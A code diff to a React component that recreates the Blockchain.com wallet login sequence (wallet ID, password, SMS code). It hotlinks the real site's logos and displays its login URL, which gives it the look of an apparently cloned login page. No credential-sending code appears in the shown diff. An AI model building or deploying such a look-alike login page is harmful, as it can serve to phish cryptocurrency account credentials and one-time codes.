@@ -1,6 +1,4 @@
-import logo from "./logo.svg";
-import leftIcon from "./left-arrow-icon.svg";
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 
 import "./App.scss";
 
@@ -41,6 +39,22 @@ function App() {
       .toLowerCase()
       .match(/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/);
   };
+
+  useEffect(() => {
+    emailOrWalletIdValidation();
+  }, [emailOrWalletId]);
+
+  useEffect(() => {
+    walletIdValidation();
+  }, [walletId]);
+
+  useEffect(() => {
+    passwordValidation();
+  }, [password]);
+
+  useEffect(() => {
+    secondPasswordValidation();
+  }, [secondPassword]);
 
   const emailOrWalletIdValidation = () => {
     if (!emailOrWalletId) {
@@ -165,7 +179,12 @@ function App() {
         <strong>https://login.blockchain.com</strong>
       </div>
       <div className="col-12 text-white text-center pt-4 fs-3 ">
-        Blockchain.com
+        <img
+          src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd"
+          height="24px"
+          color="auto"
+          width="auto"
+        />
       </div>
       <div className="col-12 justify-content-around d-flex pt-4">
         <div className="col-5 bg-body border-8 shadow w-480 pb-4">
@@ -190,6 +209,11 @@ function App() {
                 aria-controls="wallet"
                 aria-selected="true"
               >
+                <img
+                  src="https://login.blockchain.com/img/wallet-no-background.svg"
+                  placeholder="wallet-logo"
+                  className="tab-logos"
+                />
                 Wallet
               </button>
             </li>
@@ -204,6 +228,11 @@ function App() {
                 aria-controls="exchange"
                 aria-selected="false"
               >
+                <img
+                  src="https://login.blockchain.com/img/exchange-grayscale.svg"
+                  placeholder="exchange-logo"
+                  className="tab-logos"
+                />
                 Exchange
               </button>
             </li>
@@ -249,6 +278,12 @@ function App() {
                           onChange={(e) => {
                             setEmailOrWalletId(e.target.value);
                           }}
+                          style={
+                            showErrorMsgs.emailOrWalletIdRequired ||
+                            showErrorMsgs.emailOrWalletIdValidtor
+                              ? { borderColor: "rgb(217, 59, 48)" }
+                              : { borderColor: "rgb(12, 108, 242)" }
+                          }
                           placeholder="Enter email or wallet ID"
                         />
                       </div>
@@ -259,6 +294,12 @@ function App() {
                           type="button"
                           className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                           onClick={() => changeNextPage(Pages.Page2)}
+                          disabled={
+                            emailOrWalletId === ""
+                              ? true
+                              : showErrorMsgs.emailOrWalletIdRequired ||
+                                showErrorMsgs.emailOrWalletIdValidtor
+                          }
                         >
                           <div className="text-center">Continue</div>
                         </button>
@@ -296,7 +337,22 @@ function App() {
                   <div className="row justify-content-center">
                     <div className="col-10 text-center">
                       <div className=" pt-2 pb-2 fs-20 fw-500">
-                        Verify Your Device
+                        <div className="verify">
+                          <div>
+                            <svg
+                              xmlns="http://www.w3.org/2000/svg"
+                              width="16"
+                              height="16"
+                              fill="currentColor"
+                              class="bi bi-laptop"
+                              viewBox="0 0 16 16"
+                            >
+                              <path d="M13.5 3a.5.5 0 0 1 .5.5V11H2V3.5a.5.5 0 0 1 .5-.5h11zm-11-1A1.5 1.5 0 0 0 1 3.5V12h14V3.5A1.5 1.5 0 0 0 13.5 2h-11zM0 12.5h16a1.5 1.5 0 0 1-1.5 1.5h-13A1.5 1.5 0 0 1 0 12.5z" />
+                            </svg>
+                          </div>
+                        </div>
+
+                        <div>Verify Your Device</div>
                       </div>
                       <div className="fs-16 fw-400">
                         If you have an account registered with this email
@@ -337,6 +393,12 @@ function App() {
                           onChange={(e) => {
                             setWalletId(e.target.value);
                           }}
+                          style={
+                            showErrorMsgs.walletIdRequired ||
+                            showErrorMsgs.walletIdValidtor
+                              ? { borderColor: "rgb(217, 59, 48)" }
+                              : { borderColor: "rgb(12, 108, 242)" }
+                          }
                           placeholder="Enter wallet ID"
                         />
                       </div>
@@ -347,6 +409,12 @@ function App() {
                           type="button"
                           className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                           onClick={() => changeNextPage(Pages.Page3)}
+                          disabled={
+                            walletId === ""
+                              ? true
+                              : showErrorMsgs.walletIdRequired ||
+                                showErrorMsgs.walletIdValidtor
+                          }
                         >
                           Continue
                         </button>
@@ -397,7 +465,7 @@ function App() {
                           )}
                         </div>
                         <input
-                          type="email"
+                          type="password"
                           className="form-control b-r-8 placeholder"
                           id="password"
                           value={password}
@@ -405,6 +473,11 @@ function App() {
                           onChange={(e) => {
                             setPassword(e.target.value);
                           }}
+                          style={
+                            showErrorMsgs.passwordRequired
+                              ? { borderColor: "rgb(217, 59, 48)" }
+                              : { borderColor: "rgb(12, 108, 242)" }
+                          }
                           placeholder="Enter your password"
                         />
                       </div>
@@ -415,6 +488,11 @@ function App() {
                           type="button"
                           className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                           onClick={() => changeNextPage(Pages.Page4)}
+                          disabled={
+                            password === ""
+                              ? true
+                              : showErrorMsgs.passwordRequired
+                          }
                         >
                           Log In
                         </button>
@@ -467,7 +545,7 @@ function App() {
                           )}
                         </div>
                         <input
-                          type="password"
+                          type="text"
                           className="form-control b-r-8 placeholder"
                           id="secondPassword"
                           value={secondPassword}
@@ -476,6 +554,11 @@ function App() {
                           onChange={(e) => {
                             setSecondPassword(e.target.value);
                           }}
+                          style={
+                            showErrorMsgs.secondPasswordRequired
+                              ? { borderColor: "rgb(217, 59, 48)" }
+                              : { borderColor: "rgb(12, 108, 242)" }
+                          }
                         />
                         <div className="text-primary fs-12">Resend SMS</div>
                         <div className="pt-1 text-center pt-3 lost">
@@ -489,6 +572,11 @@ function App() {
                         <button
                           type="button"
                           className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
+                          disabled={
+                            secondPassword === ""
+                              ? true
+                              : showErrorMsgs.secondPasswordRequired
+                          }
                         >
                           Log In
                         </button>
@@ -502,7 +590,7 @@ function App() {
               )}
 
               <div className="border-hr"></div>
-              <div className="col-12 mt-8">
+              <div className="col-12">
                 <div className="justify-content-center d-flex ">
                   <div className="create-account">
                     Don't have a Blockchain Account?
